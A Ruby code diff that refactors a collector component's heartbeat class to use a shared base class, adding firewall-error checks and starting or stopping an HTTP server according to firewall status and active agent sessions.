@@ -1,53 +1,59 @@
-#
-#  Heartbeat to update the status of the component in the db
-#
-
-# relatives
-require_relative 'sessions.rb'
-
-# from RCS::Common
 require 'rcs-common/trace'
 require 'rcs-common/systemstatus'
+require 'rcs-common/heartbeat'
+require 'rcs-common/winfirewall'
+
+require_relative 'sessions'
+require_relative 'firewall'
 
 module RCS
-module Collector
+  module Collector
+    class HeartBeat < RCS::HeartBeat::Base
+      component :collector
 
-class HeartBeat
-  extend RCS::Tracer
+      attr_reader :firewall_error_message
 
-  def self.perform
-    # if the database connection has gone
-    # try to re-login to the database again
-    DB.instance.connect! if not DB.instance.connected?
+      before_heartbeat do
+        # if the database connection has gone
+        # try to re-login to the database again
+        unless DB.instance.connected?
+          trace :debug, "heartbeat: try to reconnect to rcs-db"
+          DB.instance.connect!(:collector)
+        end
 
-    # still no luck ?  return and wait for the next iteration
-    return unless DB.instance.connected?
+        @firewall_error_message = Firewall.error_message
 
-    # report our status to the db
-    component = "RCS::Collector"
-    # used only by NC
-    ip = ''
+        # still no luck ?  return and wait for the next iteration
+        DB.instance.connected?
+      end
 
-    # retrieve how many session we have
-    # this number represents the number of agent that are synchronizing
-    active_sessions = SessionManager.instance.length
+      after_heartbeat do
+        if firewall_error_message
+          trace(:error, "#{firewall_error_message}. The http server will #{HttpServer.running? ? 'stop now' : 'remain disabled'}")
+          HttpServer.stop
+        elsif !HttpServer.running?
+          Firewall.create_default_rules
+          HttpServer.start
+        elsif Firewall.first_anonymizer_changed?
+          Firewall.create_default_rules
+        end
+      end
 
-    # if we are serving agents, report it accordingly
-    message = (active_sessions > 0) ? "Serving #{active_sessions} sessions" : "Idle..."
+      def status
+        return 'ERROR' if firewall_error_message
+        super()
+      end
 
-    # report our status
-    status = SystemStatus.my_status
-    disk = SystemStatus.disk_free
-    cpu = SystemStatus.cpu_load
-    pcpu = SystemStatus.my_cpu_load(component)
+      def message
+        return firewall_error_message if firewall_error_message
 
-    # create the stats hash
-    stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}
+        # retrieve how many session we have
+        # this number represents the number of agent that are synchronizing
+        active_sessions = SessionManager.instance.length
 
-    # send the status to the db
-    DB.instance.update_status component, ip, status, message, stats, 'collector', $version
+        # if we are serving agents, report it accordingly
+        message = (active_sessions > 0) ? "Serving #{active_sessions} sessions" : "Idle..."
+      end
+    end
   end
 end
-
-end #Collector::
-end #RCS::
